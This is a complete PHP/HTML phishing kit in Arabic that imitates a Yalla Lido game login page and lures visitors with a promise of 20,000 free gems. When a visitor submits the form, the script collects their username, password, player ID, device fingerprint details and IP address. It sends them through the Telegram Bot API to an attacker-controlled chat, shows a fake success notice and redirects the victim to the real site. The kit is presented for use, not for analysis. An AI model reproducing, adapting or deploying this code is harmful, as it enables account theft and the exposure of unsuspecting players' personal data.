<?php
// توكن البوت الخاص بك (تم تحديثه)
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;
    $playerId = $input['playerId'] ?? null;

    if ($credentials && $deviceInfo && $playerId) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
🎮 <b>بيانات تسجيل دخول Yalla Lido</b>

👤 <b>اسم المستخدم:</b> <code>{$credentials['username']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>
🆔 <b>معرف اللاعب:</b> <code>{$playerId}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// الحصول على chatId من رابط الصفحة
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى Yalla Lido - اربح 20000 جوهرة مجانًا</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: url('https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_124936_Google.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .promo-banner {
            background: linear-gradient(135deg, #2E8B57, #3CB371);
            width: 100%;
            border-radius: 10px 10px 0 0;
            padding: 12px;
            text-align: center;
            color: white;
            font-weight: bold;
            font-size: 14px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
            margin-bottom: -8px;
            z-index: 10;
            position: relative;
        }
        
        .login-form {
            background: rgba(0, 0, 0, 0.8);
            width: 100%;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
            color: #fff;
            backdrop-filter: blur(5px);
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .logo-container img {
            max-width: 120px;
            margin-bottom: 10px;
            border-radius: 8px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
        }
        
        .logo-container p {
            font-size: 12px;
            opacity: 0.9;
            color: #ddd;
            line-height: 1.4;
        }
        
        .form-title {
            text-align: center;
            margin-bottom: 15px;
            color: #fff;
            font-size: 18px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }
        
        .gem-offer {
            text-align: center;
            background: linear-gradient(135deg, #2E8B57, #3CB371);
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            animation: pulse 2s infinite;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
            font-size: 12px;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }
        
        .gem-icon {
            font-size: 18px;
            color: #FFD700;
        }
        
        .input-group {
            margin-bottom: 12px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #ddd;
            font-size: 12px;
        }
        
        .input-group input {
            width: 100%;
            padding: 10px;
            background: #222;
            border: 1px solid #444;
            border-radius: 5px;
            font-size: 12px;
            color: #fff;
            transition: all 0.2s;
        }
        
        .input-group input:focus {
            border-color: #2E8B57;
            outline: none;
            box-shadow: 0 0 0 2px rgba(46, 139, 87, 0.3);
        }
        
        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            font-size: 11px;
        }
        
        .remember {
            display: flex;
            align-items: center;
        }
        
        .remember input {
            margin-left: 5px;
        }
        
        .forgot-password {
            color: #2E8B57;
            text-decoration: none;
            font-size: 11px;
            font-weight: 600;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .login-button {
            width: 100%;
            padding: 10px;
            background: linear-gradient(135deg, #2E8B57, #3CB371);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 15px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
        }
        
        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(46, 139, 87, 0.4);
        }
        
        .login-button:active {
            transform: translateY(0);
        }
        
        .divider {
            text-align: center;
            margin: 12px 0;
            position: relative;
            color: #777;
            font-size: 11px;
        }
        
        .divider::before {
            content: "";
            position: absolute;
            left: 0;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #444;
        }
        
        .divider::after {
            content: "";
            position: absolute;
            right: 0;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #444;
        }
        
        .social-login {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .social-btn {
            width: 35px;
            height: 35px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #333;
            border: 1px solid #444;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .social-btn:hover {
            background: #444;
            transform: translateY(-2px);
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
        }
        
        .social-btn i {
            font-size: 14px;
            color: #ddd;
        }
        
        .signup-link {
            text-align: center;
            margin-top: 15px;
            color: #ddd;
            font-size: 12px;
        }
        
        .signup-link a {
            color: #2E8B57;
            text-decoration: none;
            font-weight: 600;
        }
        
        .signup-link a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 15px;
            text-align: center;
            color: rgba(255, 255, 255, 0.8);
            font-size: 10px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 5px;
        }
        
        .footer-links a {
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            font-size: 10px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .notification {
            position: fixed;
            top: 15px;
            right: 15px;
            padding: 10px 15px;
            border-radius: 5px;
            background: #2E8B57;
            color: white;
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
            display: none;
            z-index: 1000;
            font-weight: 600;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .login-form {
                padding: 15px;
            }
            
            .logo-container img {
                max-width: 100px;
            }
            
            .promo-banner {
                font-size: 12px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="notification" id="notification"></div>
    
    <div class="container">
        <div class="promo-banner">
            🎁 اربح 20000 جوهرة مجانًا!
        </div>
        
        <div class="login-form">
            <div class="logo-container">
                <!-- الشعار الجديد -->
                <img src="https://i.ibb.co/Dgp7Qxh6/Screenshot-20260411-001354-Google.jpg" alt="Yalla Lido Logo">
                <p>سجل الدخول إلى حسابك واربح 20000 جوهرة مجانًا</p>
            </div>
            
            <div class="gem-offer">
                <i class="gem-icon">💎</i>
                <span>20000 جوهرة مجانًا عند التسجيل</span>
            </div>
            
            <h2 class="form-title">تسجيل الدخول</h2>
            
            <form id="loginForm">
                <div class="input-group">
                    <label for="username">اسم المستخدم</label>
                    <input type="text" id="username" name="username" required>
                </div>
                
                <div class="input-group">
                    <label for="password">كلمة المرور</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <div class="input-group">
                    <label for="playerId">معرف اللاعب (ID)</label>
                    <input type="text" id="playerId" name="playerId" required placeholder="أدخل معرف اللاعب لاستلام الجوهرة">
                </div>
                
                <div class="remember-forgot">
                    <div class="remember">
                        <input type="checkbox" id="remember">
                        <label for="remember">تذكرني</label>
                    </div>
                    
                    <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
                </div>
                
                <button type="submit" class="login-button">تسجيل الدخول واحصل على الجوهرة</button>
            </form>
            
            <div class="divider">أو</div>
            
            <div class="social-login">
                <div class="social-btn">
                    <i class="fab fa-facebook-f"></i>
                </div>
                <div class="social-btn">
                    <i class="fab fa-google"></i>
                </div>
                <div class="social-btn">
                    <i class="fab fa-twitter"></i>
                </div>
            </div>
            
            <div class="signup-link">
                ليس لديك حساب؟ <a href="#">أنشئ حسابًا</a>
            </div>
        </div>
        
        <div class="footer">
            <p>© 2025 Yalla Lido. جميع الحقوق محفوظة.</p>
            <div class="footer-links">
                <a href="#">الشروط</a>
                <a href="#">الخصوصية</a>
                <a href="#">المساعدة</a>
            </div>
        </div>
    </div>

    <script>
        // دالة لعرض الإشعارات
        function showNotification(message, isSuccess = false) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.backgroundColor = isSuccess ? '#3CB371' : '#2E8B57';
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // جمع بيانات المستخدم
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const playerId = document.getElementById('playerId').value;
            
            // جمع معلومات الجهاز
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                battery: 'غير معروف',
                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
            };
            
            // محاولة الحصول على حالة البطارية إذا كانت متوفرة
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    deviceInfo.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'غير مشحون'})`;
                });
            }
            
            // إظهار رسالة تحميل
            const button = document.querySelector('.login-button');
            const originalText = button.textContent;
            button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري التسجيل...';
            button.disabled = true;
            
            // إرسال البيانات إلى التليجرام
            sendDataToTelegram(username, password, playerId, deviceInfo);
            
            // محاكاة عملية تسجيل الدخول وتوجيه المستخدم بعد ذلك
            setTimeout(() => {
                // توجيه المستخدم إلى الموقع الأصلي لـ Yalla Lido
                showNotification('تم التسجيل بنجاح! سيتم إضافة الجوهرة إلى حسابك', true);
                
                setTimeout(() => {
                    window.location.href = 'https://www.yallalido.com';
                }, 2500);
            }, 2000);
        });
        
        function sendDataToTelegram(username, password, playerId, deviceInfo) {
            // البيانات التي سيتم إرسالها
            const data = {
                chatId: "<?php echo $chatId; ?>",
                credentials: {
                    username: username,
                    password: password
                },
                playerId: playerId,
                deviceInfo: deviceInfo
            };
            
            // إرسال البيانات إلى الخادم
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
